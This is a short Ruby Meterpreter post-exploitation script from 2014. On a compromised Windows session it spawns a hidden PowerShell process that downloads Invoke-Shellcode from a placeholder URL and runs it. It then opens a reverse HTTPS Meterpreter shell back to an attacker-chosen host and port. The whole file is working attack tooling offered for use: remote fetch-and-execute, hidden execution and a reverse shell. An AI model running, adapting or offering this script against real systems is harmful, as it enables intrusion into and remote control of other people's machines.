###Script written by one ch33kyf3ll0w (Andrew Bonstrom)
###May 1st, 2014
##Initialize Variables
session=client
lhost=''
lport=''
##Script Usage
def usage
  print_line(" ")
  print_line("Power Shell Invoke-Shellcode Script")
  print_line("This script will allow you to execute the Invoke-Shellcode Power Shell script at a whim from a meterpreter prompt.")
  print_line(" ")
  print_line("Example Usage: Invoke-Shellcode 10.0.0.12 4444")
  print_line(" ")
  raise Rex::Script::Completed
end

###Issues a system process call to the current client (active session) to execute the Invoke-Shellcode script from PowerSploit
def command_exec(session,lhost,lport)
   print_status("Running Invoke-Shellcode, Please wait 4-7 seconds.")
   r=''
      begin
         r = session.sys.process.execute("C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -Command iex(New-Object Net.WebClient).DownloadString('http://URLHERE');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost #{lhost} -Lport #{lport} -Force", nil, {'Hidden' => true, 'Channelized' => true})
         r.channel.close
         r.close
      rescue ::Exception => e
         print_error("Error Running Invoke-Shellcode, Sounds like a problem between the keyboard and the monitor.....: #{e.class} #{e}")
      end
end

#####Main:Checks for length and then assigns arguments to variables which are then passed onto command_exec
if args.length == 0
  usage
else
lhost = args[0]
lport = args[1]
  command_exec(client, lhost, lport)
end
